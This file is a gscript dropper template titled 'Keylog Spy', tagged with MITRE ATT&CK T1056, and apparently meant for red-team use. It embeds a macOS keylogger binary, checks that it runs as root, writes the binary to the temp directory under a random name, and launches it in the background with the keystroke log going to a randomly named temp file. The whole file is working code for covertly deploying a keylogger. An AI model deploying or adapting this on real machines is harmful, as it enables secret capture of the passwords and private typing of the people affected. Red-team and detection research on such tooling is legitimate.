// Example gscript template
// Title: Keylog Spy
// Author: ahhh
// Purpose: Starts recording keylogs, saves them in /var/log/keystroke.log
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
// Using: this keylogger https://github.com/caseyscarborough/keylogger

//priority:150
//timeout:150

//go_import:os as os
//go_import:os/user as user

//import:/private/tmp/keylogger.macho

function Deploy() {  
    console.log("Starting keylogger");
    // Drop the sample
    var keylogBin = GetAssetAsBytes("keylogger.macho");
    if (keylogBin[1] != null) {
        console.log("errors: "+keylogBin[1].Error());
    }
    
    // get user homedir
    var curUser = user.Current();
    console.log("Our user is: "+curUser[0].Username);
    if (curUser[0].Username == "root") {
        // Getting a random name
        var temppath = os.TempDir();
        var naming = G.rand.GetAlphaString(4);
        var name = naming.toLowerCase();
        name = temppath+"/"+name;
        G.file.WriteFileFromBytes(name, keylogBin[0]);
        console.log("dropped the keylogger binary here: "+name); 

        // Getting a random outfile
        var t2 = os.TempDir();
        var n2 = G.rand.GetAlphaString(6);
        n2 = n2.toLowerCase();
        n2 = t2+"/"+n2;       
        console.log("writing log file here: "+n2); 

        // Run the command
        var runner = G.exec.ExecuteCommandAsync(name, [n2]);
        if (runner[1] != null) {
            console.log("errors: "+runner[1].Error());
        } else {
            console.log("pid: "+runner[0].Process.Pid);
        }
    } else {
        console.log("Must be run as root");
    }

    console.log("Done keylogger");
    return true;
}